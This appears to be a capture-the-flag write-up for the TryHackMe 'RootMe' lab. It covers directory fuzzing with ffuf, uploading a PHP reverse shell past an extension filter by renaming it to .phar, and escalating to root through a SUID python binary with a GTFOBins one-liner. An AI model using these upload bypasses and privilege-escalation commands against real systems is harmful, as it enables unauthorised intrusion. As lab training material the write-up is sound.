We some some CVE assigned to that Apache version. Fuzzing the web we found:

```console
zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u 'http://10.10.179.194/FUZZ'

```

Inside of `/uplaods/` we found a empty directory. In `/panel/` we can see that we can upload some files. Let’s try with the default pentestmonkey reverse shell.

# Fingerprint

Upload the shell to the target and we got the following error:

![Untitled](/assets/img/tryhackme/rooms/rootme/Untitled.png)

Let’s try finding what type of file accepts. Uploading `shell.php3`{: .filepath} allow us. Now we can see the file in the `/uploads/` path. Start a netcat and connect to it. We first see that our file didn’t executed.

Trying with `shell.phar`{: .filepath} will work.

# Privilege Escalation

We will search for SUID, finding one particular binary:

```console
bash-4.4$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

	-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python
```

We will use [GTFObins](https://gtfobins.github.io/gtfobins/python/#suid) to get the explotation:

```console
$ /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
	root
```
